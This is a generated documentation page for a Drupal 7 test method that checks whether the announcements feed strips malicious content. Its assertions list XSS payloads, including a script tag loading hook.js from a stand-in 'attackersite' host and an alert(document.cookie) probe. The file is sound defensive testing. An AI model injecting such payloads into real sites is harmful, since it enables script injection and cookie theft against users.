# AnnounceFeedTestSanitizationTestCase::testSanitizedFeedResponse()

- **Type:** Method
- **File:** [`modules/announcements_feed/tests/announce_feed_test.test`](../_file.md), lines 401–411 · [local source](../../../../../../source/modules/announcements_feed/tests/announce_feed_test.test) · [GitHub](https://github.com/drupal/drupal/blob/7.103/modules/announcements_feed/tests/announce_feed_test.test#L401-L411)
- **Class:** [AnnounceFeedTestSanitizationTestCase](../AnnounceFeedTestSanitizationTestCase.md)
- **Module/theme:** announce_feed_test

## Signature

```php
public function testSanitizedFeedResponse()
```

## Documentation

```text
Test the announcements feed with malicious content.
```

## Code

```php
  public function testSanitizedFeedResponse() {
    $this->drupalLogin($this->user);
    $this->drupalGet('');
    $this->clickLink('Announcements');
    $this->drupalGet('admin/announcements_feed');
    $this->assertNoRaw("<script>alert('drupal')</script>");
    $this->assertNoRaw("onerror='alert(123)'");
    $this->assertNoRaw('alert(document.cookie)');
    $this->assertNoRaw('<script src=http://attackersite/hook.js></script>');
    $this->drupalLogout();
  }
```

---
_Drupal 7.103 · [modules/announcements_feed/tests/announce_feed_test.test](https://github.com/drupal/drupal/blob/7.103/modules/announcements_feed/tests/announce_feed_test.test) · Licensed GPL-2.0-or-later (see LICENSE)._
